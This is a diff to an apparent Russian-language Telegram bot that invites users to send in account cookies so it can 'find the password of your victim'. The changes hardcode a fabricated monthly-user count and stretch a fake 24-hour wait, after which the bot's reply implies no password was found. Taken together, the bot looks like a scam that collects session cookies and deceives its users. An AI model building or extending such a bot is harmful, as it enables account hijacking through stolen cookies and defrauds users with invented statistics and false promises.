@@ -109,6 +109,10 @@ def get_referral_count(user_id):
     """Получает количество приглашенных пользователей"""
     return len(get_user_referrals(user_id))
 
+def get_monthly_users_count():
+    """Возвращает фиксированное число 57 925"""
+    return 57925
+
 # ===================================================
 # ФУНКЦИИ ДЛЯ РАБОТЫ С ФАЙЛАМИ
 # ===================================================
@@ -263,10 +267,6 @@ def save_message(user_id, username, first_name, text, timestamp):
             json.dump(messages, f, ensure_ascii=False, indent=2)
     except Exception as e:
         print(f"Ошибка сохранения сообщения: {e}")
-
-def get_monthly_users_count():
-    """Возвращает фиксированное число 57 926"""
-    return 57926
 
 # ===================================================
 # ФУНКЦИЯ ДЛЯ СОЗДАНИЯ КЛАВИАТУРЫ УДАЛЕНИЯ
@@ -519,7 +519,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.message.reply_text(
             "Скинь cookie в бота\n"
             "И бот начнет поиск пароля вашей жертвы😈\n"
-            "В течении дня бот скинет вам пароль от аккаунта"
+            "В течении 24 часов бот скинет вам пароль от аккаунта"
         )
         return
     
@@ -777,7 +777,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         text += f"👥 Всего пользователей: {len(all_users)}\n"
         text += f"🔑 С ключевым словом: {len(keyword_users)}\n"
         text += f"📩 Сообщений сохранено: {total_messages}\n\n"
-        text += f"📈 **Пользователей в месяц: 57 926**\n\n"
+        text += f"📈 **Пользователей в месяц: 57 925**\n\n"
         
         today = datetime.now().strftime("%Y-%m-%d")
         today_count = sum(1 for user_data in all_users.values() if user_data.get("first_seen", "").startswith(today))
@@ -1234,7 +1234,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             "Отлично, наш бот уже начал поиски пароля вашей жертвы.\n"
             "Не создавайте повторных заявок, иначе будете заблокированы\n"
-            "Если в течении 6 часов бот не ответил, значит он не нашел пароль от аккаунта"
+            "Если в течении 24 часов бот не ответил, значит он не нашел пароль от аккаунта"
         )
         asyncio.create_task(send_delayed_message(update.effective_chat.id, context))
     else:
@@ -1264,11 +1264,11 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("У вас нет активной рассылки.")
 
 # ===================================================
-# ФУНКЦИЯ ЗАДЕРЖКИ
+# ФУНКЦИЯ ЗАДЕРЖКИ (24 часа)
 # ===================================================
 
 async def send_delayed_message(chat_id, context):
-    delay_seconds = 6 * 3600 + 3 * 60
+    delay_seconds = 24 * 3600  # 24 часа
     try:
         await asyncio.sleep(delay_seconds)
         await context.bot.send_message(
@@ -1294,7 +1294,8 @@ def main():
     print("📩 Админские кнопки видны только тебе (ID: 1341594703)")
     print("🎯 У каждого пользователя 3 бесплатные попытки")
     print("👥 За каждого приглашенного друга +1 попытка")
-    print("📊 Пользователей в месяц: 57 926")
+    print("📊 Пользователей в месяц: 57 925")
+    print("⏰ Задержка перед ответом: 24 часа")
     app.run_polling()
 
 if __name__ == "__main__":
